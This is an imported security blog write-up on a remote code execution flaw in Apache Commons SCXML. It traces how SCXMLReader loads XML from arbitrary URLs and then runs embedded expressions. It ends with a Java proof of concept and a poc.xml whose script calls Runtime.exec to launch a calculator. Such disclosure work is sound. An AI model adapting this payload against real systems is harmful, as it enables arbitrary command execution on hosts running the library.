---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-06_apache-scxml-remote-code-execution.md
original_filename: 2023-02-06_apache-scxml-remote-code-execution.md
title: Apache SCXML Remote Code Execution
category: documents
detected_topics:
- command-injection
- business-logic
- api-security
tags:
- imported
- documents
- command-injection
- business-logic
- api-security
language: en
raw_sha256: 66bb0bf8e8c6add9a4d13f3221baad96f43aaf1ad3b33b43dc83abf3871aed10
text_sha256: 919c252cb118828fab1464cb431331d33e1f9d278289285afe229e7425e090f3
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Apache SCXML Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-06_apache-scxml-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, business-logic, api-security
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `66bb0bf8e8c6add9a4d13f3221baad96f43aaf1ad3b33b43dc83abf3871aed10`
- Text SHA256: `919c252cb118828fab1464cb431331d33e1f9d278289285afe229e7425e090f3`


## Content

---
title: "Apache SCXML Remote Code Execution"
page_title: "Apache Commons SCXML Remote Code Execution"
url: "https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/"
final_url: "https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/"
authors: ["pyn3rd (@pyn3rd)"]
programs: ["Apache SCXML"]
bugs: ["RCE", "Security code review"]
publication_date: "2023-02-06"
added_date: "2023-02-13"
source: "pentester.land/writeups.json"
original_index: 1572
---

#  Apache Commons SCXML Remote Code Execution 

by pyn3rd

2023-02-06 (Updated: 2023-10-09) 

##### 0x01 Preface

  * What is Apache Commons SCXML? 

Here is the Apache offical explanation.

State Chart XML (SCXML) is currently a Working Draft specification published by the World Wide Web Consortium (W3C). SCXML provides a generic state-machine based execution environment based on Harel State Tables. SCXML is a candidate for the control language within multiple markup languages coming out of the W3C (see the latest Working Draft for details). Commons SCXML is an implementation aimed at creating and maintaining a Java SCXML engine capable of executing a state machine defined using a SCXML document, while abstracting out the environment interfaces.

##### 0x02 How to find it

When I audited the source code, I unintentionally found out a sensitive class named `SCXMLReader`.

![upload successful](/images/pasted-241.png)

Then I kept on analysing the critical class `SCXMLReader`. The class consisted of serveral static methods, one of them named `read`, it could load a XML file by the parameter `scxmlPath`. However, the method did not verify the legal resource of the XML file, in the other words, it could load a XML file from any untrustworthy resource.

![upload successful](/images/pasted-253.png)

Next, I stepped into the `readInternal` method, it tried to resovle the URL of the XML file.

![upload successful](/images/pasted-244.png)

Obviously, it did not restrict the loading resource, and a remote resource can also be initialized.  
![upload successful](/images/pasted-255.png)

Then, I stepped into the `getReader` method, it tried to load the XML stream as input.  
![upload successful](/images/pasted-245.png)

If there is a URL as file path, the input stream will obtain from the URL resource.  
![upload successful](/images/pasted-256.png)

The XML stream will be returned finally.  
![upload successful](/images/pasted-246.png)

Next, I definitely should utilize some method to handle with the XML stream, here I convinced myself the method called `setStateMachine` was what I needed.  
![upload successful](/images/pasted-247.png)

Then I stepped into the method. We can see the initialization of the instance.  
![upload successful](/images/pasted-248.png)

At last, the instance was intialized and the Java Expression Lauguage in XML file was be executed by `getEvaluator` method.  
![upload successful](/images/pasted-249.png)

##### 0x03 Proof of Concept

By convention, I eventually demostrate it with the explicit PoC.
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  7  
  8  
  9  
  10  
  11  
  12  
  13  
  14  
  15  
  16  
  17  
  18  
  19  
  20  
  21  
  22  
  

| 
  
  
  import org.apache.commons.scxml2.SCXMLExecutor;  
  import org.apache.commons.scxml2.io.SCXMLReader;  
  import org.apache.commons.scxml2.model.ModelException;  
  import org.apache.commons.scxml2.model.SCXML;  
  
  import javax.xml.stream.XMLStreamException;  
  import java.io.IOException;  
  
  public class SCXMLDemo {  
  public static void main(String[] args) throws ModelException, XMLStreamException, IOException {  
  
  // engine to execute the scxml instance  
  SCXMLExecutor executor = new SCXMLExecutor();  
  // parse SCXML URL into SCXML model  
  SCXML scxml = SCXMLReader.read("http://127.0.0.1:8000/poc.xml");  
  
  // set state machine (scxml instance) to execute  
  executor.setStateMachine(scxml);  
  executor.go();  
  
  }  
  }  
  
  
---|---  
  
poc.xml
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  7  
  8  
  9  
  10  
  

| 
  
  
  <?xml version="1.0"?>  
  <scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">  
  <state id="run">  
  <onentry>  
  <script>  
  ''.getClass().forName('java.lang.Runtime').getRuntime().exec('open -a calculator')  
  </script>  
  </onentry>  
  </state>  
  </scxml>  
  
  
---|---  
  
The screenshot of this illustration.  
![upload successful](/images/pasted-237.png)
